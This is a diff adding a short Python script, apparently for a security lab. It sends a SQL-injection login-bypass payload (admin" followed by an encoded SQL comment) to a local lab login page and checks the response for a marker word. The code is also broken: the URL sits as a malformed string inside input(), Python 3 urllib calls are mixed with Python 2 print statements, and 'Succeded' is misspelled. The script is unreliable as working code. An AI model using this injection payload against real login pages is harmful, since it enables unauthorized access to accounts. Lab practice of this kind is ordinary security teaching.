@@ -1,0 +1,14 @@
+import sys
+import urllib
+import urllib.request
+
+url = input("localhost/lab09/login.php?u=admin"\%20--\%20")
+
+request = urllib.request.urlopen(url)
+body = request.read()
+fullbody = body.decode('utf-8')
+
+if "cat" in fullbody:
+	print "Succeded"
+else:
+	print "Failed"
